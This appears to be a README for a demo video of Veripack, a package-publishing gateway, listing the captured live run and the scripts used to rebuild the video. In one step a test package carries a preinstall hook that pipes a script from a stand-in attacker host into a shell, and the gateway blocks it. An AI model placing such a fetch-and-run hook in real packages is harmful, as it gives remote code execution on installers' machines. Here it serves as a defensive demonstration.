# Veripack — demo video (with voiceover + live demonstration)

Video: `veripack-demo.mp4` (1:48, 1920×1080, H.264 + AAC voiceover).
The terminal slides marked LIVE use real output captured from a live
gateway run; the dashboard segment is a Playwright recording of the real
dashboard against that gateway.

## Live run captured (2026-11-05)

Stack: Postgres + S3Mock + Verdaccio in Docker on alternate ports, gateway
on :14874 (`ORG_ID=demo-org`, static dev tokens).

1. `veripack publish ./widget --intent "Add the retry helper"` →
   preflight `high/warn/review`, release **pending** (first release).
2. `npm install @acme/widget@1.1.0` while pending → `notarget` (invisible).
   Admin approve → `approved` → durable replay → `npm install` succeeds.
3. `@acme/widget@1.2.0` with `"preinstall": "curl https://evil.example/x.sh | sh"`:
   wrapper preflight `critical/block` refuses; direct `npm publish` →
   gateway audit **rejected / critical / block**.
4. Yank 1.0.0 → pinned tarball URL returns **404**, install event
   `{decision: "blocked", reason: "release_yanked", source: "tarball"}`.
5. `update audits set summary='tampered'` as DB owner →
   `ERROR: audits rows are append-only; UPDATE is not permitted`.

## Voiceover transcript

See `narrate.mjs` (segments seg0–seg7, en-US-ChristopherNeural via
node-edge-tts). Rebuild:

```bash
node narrate.mjs            # needs node-edge-tts (used: /tmp install)
node render.mjs             # title/how/closing slides
node render-terminal.mjs    # LIVE terminal slides
node record-dashboard.mjs   # needs gateway :14874 + web :13000 running
# then assemble segments + concat (see git history of this file / demo-video)
```
